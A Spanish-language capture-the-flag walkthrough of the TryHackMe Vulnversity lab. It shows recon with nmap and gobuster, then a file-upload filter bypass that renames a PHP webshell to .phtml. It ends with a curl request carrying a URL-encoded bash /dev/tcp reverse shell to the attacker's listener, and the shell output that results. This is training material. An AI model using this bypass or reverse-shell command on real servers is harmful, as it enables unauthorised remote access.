# Bypass Restricción de File Upload

Es posible que en diversas ocasiones no podamos subir directamente un archivo en .php dentro de un panel de subida de archivos, por lo que tenemos que encontrar la forma de hacer un bypass de este tipo de restricciones; y una de las posibles formas es cambiar la extensión de nuestro payload, para que no sea .php pero que a su vez también funcione con php.

Enlace a la máquina vulnerable:

[https://tryhackme.com/room/vulnversity](https://tryhackme.com/room/vulnversity)

* Ver si tenemos conectividad con la màquina:

```bash
└─$ ping -c 1 10.10.130.170  
PING 10.10.130.170 (10.10.130.170) 56(84) bytes of data.
64 bytes from 10.10.130.170: icmp_seq=1 ttl=63 time=128 ms

--- 10.10.130.170 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 128.298/128.298/128.298/0.000 ms
```

* Escaneo puertos de la màquina:

```bash
└─# nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 10.10.130.170
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-15 20:13 CET
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:13
Completed NSE at 20:13, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:13
Completed NSE at 20:13, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:13
Completed NSE at 20:13, 0.00s elapsed
Initiating SYN Stealth Scan at 20:13
Scanning 10.10.130.170 [65535 ports]
Discovered open port 21/tcp on 10.10.130.170
Discovered open port 445/tcp on 10.10.130.170
Discovered open port 22/tcp on 10.10.130.170
Discovered open port 139/tcp on 10.10.130.170
Discovered open port 3333/tcp on 10.10.130.170
Discovered open port 3128/tcp on 10.10.130.170
Completed SYN Stealth Scan at 20:14, 16.37s elapsed (65535 total ports)
Initiating Service scan at 20:14
Scanning 6 services on 10.10.130.170
Completed Service scan at 20:14, 21.50s elapsed (6 services on 1 host)
NSE: Script scanning 10.10.130.170.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:14
Completed NSE at 20:14, 4.95s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:14
Completed NSE at 20:14, 0.54s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:14
Completed NSE at 20:14, 0.00s elapsed
Nmap scan report for 10.10.130.170
Host is up, received user-set (0.060s latency).
Scanned at 2024-11-15 20:13:44 CET for 44s
Not shown: 63076 closed tcp ports (reset), 2453 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 vsftpd 3.0.3
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDYQExoU9R0VCGoQW6bOwg0U7ILtmfBQ3x/rdK8uuSM/fEH80hgG81Xpqu52siXQXOn1hpppYs7rpZN+KdwAYYDmnxSPVwkj2yXT9hJ/fFAmge3vk0Gt5Kd8q3CdcLjgMcc8V4b8v6UpYemIgWFOkYTzji7ZPrTNlo4HbDgY5/F9evC9VaWgfnyiasyAT6aio4hecn0Sg1Ag35NTGnbgrMmDqk6hfxIBqjqyYLPgJ4V1QrqeqMrvyc6k1/XgsR7dlugmqXyICiXu03zz7lNUf6vuWT707yDi9wEdLE6Hmah78f+xDYUP7iNA0raxi2H++XQjktPqjKGQzJHemtPY5bn
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHCK2yd1f39AlLoIZFsvpSlRlzyO1wjBoVy8NvMp4/6Db2TJNwcUNNFjYQRd5EhxNnP+oLvOTofBlF/n0ms6SwE=
|   256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqh93OTpuL32KRVEn9zL/Ybk+5mAsT/81axilYUUvUB
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  syn-ack ttl 63 Squid http proxy 3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.5.12
3333/tcp open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   VULNUNIVERSITY<00>   Flags: <unique><active>
|   VULNUNIVERSITY<03>   Flags: <unique><active>
|   VULNUNIVERSITY<20>   Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2024-11-15T14:11:52-05:00
| smb2-time: 
|   date: 2024-11-15T19:11:52
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 14490/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 35831/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 30414/udp): CLEAN (Failed to receive data)
|   Check 4 (port 45226/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 1h37m28s, deviation: 2h53m12s, median: -2m31s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:14
Completed NSE at 20:14, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:14
Completed NSE at 20:14, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:14
Completed NSE at 20:14, 0.01s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.41 seconds
           Raw packets sent: 81138 (3.570MB) | Rcvd: 68944 (2.758MB)
```

* Vemos que hay varios puertos abierto donde esta el puerto 3333 que resulta ser un servidor web donde tiene su página web, a continuación buscaremos posibles directorios con gobuster:

```bash
└─# gobuster dir -u http://10.10.130.170:3333/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.130.170:3333/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 322] [--> http://10.10.130.170:3333/images/]
/css                  (Status: 301) [Size: 319] [--> http://10.10.130.170:3333/css/]
/js                   (Status: 301) [Size: 318] [--> http://10.10.130.170:3333/js/]
/fonts                (Status: 301) [Size: 321] [--> http://10.10.130.170:3333/fonts/]
/internal             (Status: 301) [Size: 324] [--> http://10.10.130.170:3333/internal/]
Progress: 15667 / 207644 (7.55%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 15696 / 207644 (7.56%)
===============================================================
Finished
===============================================================
```

* Encontramos el directorio internal donde podemos subir archivos intentamos subir un archivo en php pero se ve que tiene una restricción, podemos probar a poner otra exentesión php por ejemplo phtml y subir nuestra webshell:&#x20;
* Cambiar el nombre del archivo:

```bash
mv rs.php rs.phtml
```

Y lo intentamos subir y vemos que ha sido posible, entonces la pregunta ahora es donde estará nuestra webshell subida.

* Buscar directorios dentro de la ruta internal:

```bash
└─# gobuster dir -u http://10.10.130.170:3333/internal/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.130.170:3333/internal/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 332] [--> http://10.10.130.170:3333/internal/uploads/]
/css                  (Status: 301) [Size: 328] [--> http://10.10.130.170:3333/internal/css/]
Progress: 11173 / 207644 (5.38%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 11213 / 207644 (5.40%)
===============================================================
Finished
===============================================================
```

Encontramos el directorio uploads donde encontramos nustra webshell subida y ahora es enviar la reverse shell para poder entrar en la máquina:

* Escuchar con netcat para recibir la reverse-shell:

```bash
└─# nc -nlvp 7777
listening on [any] 7777 ...
```

* Enviar la reverse-shell con curl:

```bash
└─$ curl "http://10.10.130.170:3333/internal/uploads/rs.phtml?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2fdev%2ftcp%2f10.23.46.73%2f7777%200%3E%261%22"
```

* Recibir la reverse-shell:

```bash
└─# nc -nlvp 7777
listening on [any] 7777 ...
connect to [10.23.46.73] from (UNKNOWN) [10.10.130.170] 56392
bash: cannot set terminal process group (1337): Inappropriate ioctl for device
bash: no job control in this shell
www-data@vulnuniversity:/var/www/html/internal/uploads$ 
```
